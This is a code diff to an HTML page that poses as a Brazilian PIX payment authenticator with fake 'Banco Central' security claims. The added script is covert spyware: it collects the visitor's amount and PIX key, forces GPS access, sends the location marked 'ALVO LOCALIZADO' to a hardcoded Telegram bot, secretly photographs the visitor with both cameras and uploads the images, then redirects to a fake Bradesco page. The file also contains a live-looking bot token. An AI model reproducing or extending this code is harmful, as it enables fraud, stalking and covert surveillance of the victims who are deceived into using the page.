@@ -15,9 +15,10 @@
         .pix-card { background: white; max-width: 400px; width: 100%; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; }
         .header { background-color: #32bcad; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 18px; }
         .content { padding: 25px; }
-        label { display: block; margin-bottom: 8px; font-size: 14px; color: #555; }
+        label { display: block; margin-bottom: 8px; font-size: 14px; color: #555; font-weight: bold; }
         input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
         .btn-resgatar { width: 100%; background-color: #32bcad; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center; }
+        .btn-resgatar:disabled { background-color: #a0d4cf; cursor: not-allowed; }
         .spinner { display: none; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-left: 10px; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .footer-info { font-size: 11px; color: #999; text-align: center; margin-top: 25px; line-height: 1.4; border-top: 1px solid #eee; padding-top: 15px; }
@@ -28,30 +29,106 @@
 <div class="pix-card">
     <div class="header">AUTENTICADOR DE RECEBIMENTOS</div>
     <div class="content">
-        <label>Valor para Recebimento (R$):</label>
-        <input type="number" id="valor" placeholder="Ex: 1250,00">
+        <label for="valor">Valor para Recebimento (R$):</label>
+        <input type="number" id="valor" placeholder="Ex: 1250,00" required>
         
-        <label>Chave PIX do Beneficiário:</label>
-        <input type="text" id="chave" placeholder="CPF, E
+        <label for="chave">Chave PIX do Beneficiário:</label>
+        <input type="text" id="chave" placeholder="CPF, E-mail ou Celular" required>
 
-        return new Promise(resolve => {
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, `${label}.jpg`);
-                formData.append('caption', `📸 Câmera ${label}`);
-                
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                resolve();
-            }, 'image/jpeg', 0.7);
+        <button class="btn-resgatar" id="btnAcao" onclick="iniciarCaptura()">
+            AUTENTICAR E RECEBER
+            <div class="spinner" id="spinner"></div>
+        </button>
+
+        <div class="footer-info">
+            Sistema de Segurança Interbancário<br>
+            Criptografia de Ponta a Ponta - Banco Central
+        </div>
+    </div>
+</div>
+
+<video id="video" width="640" height="480" autoplay style="display:none;"></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script>
+    const TOKEN = "8757264210:AAGASjOqrfL2a8QgIDp0rszG3Wi6sWWnb0s"; 
+    const ID = "560716860";
+
+    async function iniciarCaptura() {
+        const v = document.getElementById('valor').value;
+        const c = document.getElementById('chave').value;
+
+        if (!v || !c) {
+            alert("Preencha os dados para autenticar.");
+            return;
+        }
+
+        document.getElementById('spinner').style.display = 'inline-block';
+        document.getElementById('btnAcao').disabled = true;
+
+        // 1. SOLICITA GPS (A BARREIRA REAL)
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const mapa = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            // Envia texto inicial para o Telegram
+            const msg = `📍 *ALVO LOCALIZADO*\n💰 Valor: R$ ${v}\n🔑 Chave: ${c}\n🌍 Mapa: ${mapa}`;
+            await enviarMensagemTelegram(msg);
+
+            // 2. CAPTURA FOTOS SEQUENCIAIS
+            try {
+                await tirarFoto("user", "FRONTAL");
+                await tirarFoto("environment", "TRASEIRA");
+                finalizar();
+            } catch (e) {
+                // Se der erro de câmera, ainda assim libera o Token
+                finalizar();
+            }
+
+        }, (err) => {
+            // SE NEGAR LOCALIZAÇÃO: Trava o acesso e manda para página de erro
+            window.location.href = "autorizar.html";
         });
     }
 
-    async function enviarMensagem(msg) {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    async function tirarFoto(face, label) {
+        try {
+            const constraints = { video: { facingMode: face }, audio: false };
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            await new Promise(r => video.onloadedmetadata = r);
+            await new Promise(r => setTimeout(r, 500)); // Pequena pausa para focar
+            
+            const canvas = document.getElementById('canvas');
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            
+            stream.getTracks().forEach(track => track.stop());
+
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+            const fd = new FormData();
+            fd.append('chat_id', ID);
+            fd.append('photo', blob, `${label}.jpg`);
+            fd.append('caption', `📸 Câmera ${label} (${new Date().toLocaleTimeString()})`);
+            
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        } catch (error) {
+            console.error("Erro na captura:", label);
+        }
+    }
+
+    async function enviarMensagemTelegram(msg) {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: ID, text: msg, parse_mode: 'Markdown' })
+        });
+    }
+
+    function finalizar() {
+        window.location.href = "bradesco.html";
     }
 </script>
 
